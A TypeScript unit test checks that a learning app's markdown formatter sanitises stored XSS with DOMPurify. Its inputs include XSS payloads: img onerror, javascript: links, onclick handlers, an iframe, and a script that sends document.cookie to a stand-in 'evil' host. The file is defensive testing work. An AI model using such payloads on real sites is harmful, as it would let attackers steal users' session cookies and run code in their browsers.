/**
 * tests/unit/lesson-body-xss.test.ts
 *
 * P0 #7 — Stored XSS in lesson player.
 *
 * `app/(learner)/learner/courses/[moduleId]/[lessonId]/page.tsx` renders
 * `lesson.bodyMd` via a custom `inlineFormat()` whose output is then fed
 * to `dangerouslySetInnerHTML`. Today the function does no HTML escape;
 * a payload like `**<img src=x onerror=alert(1)>**` produces
 * `<strong><img src=x onerror=alert(1)></strong>` — live HTML executing
 * in the learner's browser.
 *
 * Fix: wrap inlineFormat output in DOMPurify.sanitize(). DOMPurify drops
 * any tag/attribute not on its allowlist; the only HTML inlineFormat
 * legitimately produces is <strong>, <em>, <code> — all allowlisted.
 *
 * The test imports the now-exported `inlineFormat` and asserts:
 *   - Markdown formatting still works for legitimate input
 *   - Embedded <img>, <script>, <iframe>, on*= handlers, javascript:
 *     URLs, and similar XSS payloads are stripped from the output.
 */

import { describe, it, expect } from 'vitest';
import { inlineFormat } from '@/app/(learner)/learner/courses/[moduleId]/[lessonId]/inlineFormat';

describe('inlineFormat — XSS sanitization', () => {
  it('preserves the three legitimate markdown formats', () => {
    expect(inlineFormat('**bold**')).toContain('<strong>bold</strong>');
    expect(inlineFormat('*italic*')).toContain('<em>italic</em>');
    expect(inlineFormat('`code`')).toMatch(/<code[^>]*>code<\/code>/);
  });

  it('strips <img onerror=...> embedded in markdown bold', () => {
    const out = inlineFormat('**<img src=x onerror=alert(1)>**');
    expect(out).not.toMatch(/<img/i);
    expect(out).not.toMatch(/onerror/i);
  });

  it('strips <script> tags', () => {
    const out = inlineFormat('hello <script>fetch("https://evil/?c="+document.cookie)</script>');
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toMatch(/document\.cookie/i);
  });

  it('strips <iframe> tags', () => {
    const out = inlineFormat('see *<iframe src="https://evil"></iframe>*');
    expect(out).not.toMatch(/<iframe/i);
  });

  it('strips inline event handlers (onclick, onerror, onload)', () => {
    const out = inlineFormat('**<a href="x" onclick="alert(1)">click</a>**');
    expect(out).not.toMatch(/onclick/i);
  });

  it('strips <a href="javascript:..."> live anchors (raw HTML injected, not markdown)', () => {
    // inlineFormat does not process [link](url) markdown syntax, so a literal
    // [...](javascript:...) string is plain text — not exploitable.
    // The real attack vector is raw <a> embedded directly in body_md.
    const out = inlineFormat('**<a href="javascript:alert(1)">click</a>**');
    expect(out).not.toMatch(/<a\s/i);
    expect(out).not.toMatch(/javascript:/i);
  });

  it('preserves plain text alongside stripped HTML', () => {
    const out = inlineFormat('Safe content **bold** then <img src=x onerror=alert(1)>');
    expect(out).toContain('<strong>bold</strong>');
    expect(out).toContain('Safe content');
    expect(out).not.toMatch(/<img/i);
  });
});
